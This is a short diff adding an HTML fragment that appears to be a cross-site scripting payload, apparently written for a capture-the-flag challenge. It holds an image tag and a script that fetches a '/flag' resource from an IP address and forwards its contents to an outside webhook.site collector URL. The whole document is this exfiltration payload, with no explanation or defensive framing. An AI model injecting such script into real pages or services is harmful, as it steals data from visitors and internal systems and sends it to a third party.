@@ -1,0 +1,9 @@
+<img src="http://95.182.100.126:8080/flag" />
+
+<script>
+fetch("http://95.182.100.126:8080/flag")
+  .then(r => r.text())
+  .then(f => {
+    fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d?flag=" + encodeURIComponent(f));
+  });
+</script>
